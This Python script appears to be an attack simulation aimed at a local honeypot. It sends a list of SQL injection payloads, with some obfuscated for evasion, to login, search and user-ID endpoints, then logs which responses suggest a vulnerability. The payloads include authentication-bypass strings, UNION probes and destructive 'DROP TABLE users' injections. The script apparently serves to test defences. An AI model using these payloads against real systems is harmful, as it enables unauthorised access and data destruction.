#!/usr/bin/env python3
"""
SQL Injection Attack Simulation
Tests SQL injection vulnerabilities with realistic evasion
"""

from attack_utils import RealisticAttacker, obfuscate_payload

BASE_URL = "http://localhost:3001"
attacker = RealisticAttacker(BASE_URL)

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "1' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    "' AND 1=2--",
    "'; DROP TABLE users--",
    "1'; DROP TABLE users--",
    "' OR 1=1 LIMIT 1 --",
]


def classify_response(response, payload, reflected_ok=False):
    body = response.text.lower()
    if response.status_code == 200 and response.text:
        if payload in response.text and reflected_ok:
            return True, "payload reflected in response"
        if "token" in body or "login successful" in body:
            return True, "unexpected success response"
    if "sql" in body or "mongodb" in body or "error" in body:
        return True, "server-side error text detected"
    if response.status_code >= 500:
        return True, "server-side exception triggered"
    return False, "no strong signal"


def test_login_sqli():
    """Test SQL injection in login endpoint with evasion."""
    print("Testing SQL Injection in Login...")
    print(f"Target: {BASE_URL}/api/auth/login")
    print(f"User Agent: {attacker.user_agent[:60]}...\n")

    successful_injections = 0

    for i, payload in enumerate(SQLI_PAYLOADS[:15], 1):
        try:
            test_payload = obfuscate_payload(payload) if i % 3 == 0 else payload
            response = attacker.smart_request(
                method="POST",
                endpoint="/api/auth/login",
                json_data={"email": test_payload, "password": "test"},
                retries=1,
            )

            if response is None:
                continue

            signal, reason = classify_response(response, payload)
            print(f"Payload {i}: {payload[:40]}...")
            print(f"   Status: {response.status_code}")

            if signal:
                print(f"   Potential issue: {reason}")
                successful_injections += 1
                attacker.log_attack("sqli_login", True, {"payload": payload, "reason": reason})
            else:
                attacker.log_attack("sqli_login", False, {"payload": payload})

        except Exception as e:
            print(f"   Error: {e}")

    print(f"\nLogin SQLi tests: {successful_injections} potential vulnerabilities")
    return successful_injections


def test_search_sqli():
    """Test SQL injection in search parameter."""
    print("\nTesting SQL Injection in Search...")
    print(f"Target: {BASE_URL}/api/users?search=PAYLOAD\n")

    vulnerabilities = 0

    for i, payload in enumerate(SQLI_PAYLOADS[:10], 1):
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/users",
                params={"search": payload},
                retries=1,
            )

            if response is None:
                continue

            signal, reason = classify_response(response, payload, reflected_ok=True)
            print(f"Payload {i}: {payload[:40]}...")
            print(f"   Status: {response.status_code}")

            if signal:
                print(f"   Potential issue: {reason}")
                vulnerabilities += 1
                attacker.log_attack("sqli_search", True, {"payload": payload, "reason": reason})
            else:
                attacker.log_attack("sqli_search", False, {"payload": payload})

        except Exception as e:
            print(f"   Error: {e}")

    print(f"\nSearch SQLi tests: {vulnerabilities} issues found")
    return vulnerabilities


def test_user_id_sqli():
    """Test SQL injection in user ID parameter."""
    print("\nTesting SQL Injection in User ID...")
    print(f"Target: {BASE_URL}/api/users?id=PAYLOAD\n")

    vulnerabilities = 0

    for payload in SQLI_PAYLOADS[:5]:
        try:
            response = attacker.smart_request(
                method="GET",
                endpoint="/api/users",
                params={"id": payload},
                retries=1,
            )

            if response is None:
                continue

            signal, reason = classify_response(response, payload)
            print(f"Payload: {payload[:40]}...")
            print(f"   Status: {response.status_code}")

            if signal:
                print(f"   Potential issue: {reason}")
                vulnerabilities += 1
                attacker.log_attack("sqli_userid", True, {"payload": payload, "reason": reason})
            else:
                attacker.log_attack("sqli_userid", False, {"payload": payload})

        except Exception as e:
            print(f"   Error: {e}")

    print(f"\nUser ID SQLi tests: {vulnerabilities} issues found")
    return vulnerabilities


if __name__ == "__main__":
    if not attacker.check_backend_health():
        print("Backend is not reachable on /health. Start the honeypot first.")
        raise SystemExit(1)

    login_vulns = test_login_sqli()
    search_vulns = test_search_sqli()
    user_vulns = test_user_id_sqli()

    total_vulns = login_vulns + search_vulns + user_vulns
    print(f"\nOverall Results: {total_vulns} potential SQL injection vulnerabilities detected")

    attacker.log_attack("sqli_summary", total_vulns > 0, {"total_vulnerabilities": total_vulns})
    attacker.save_attack_log("sqli_attack_log.json")
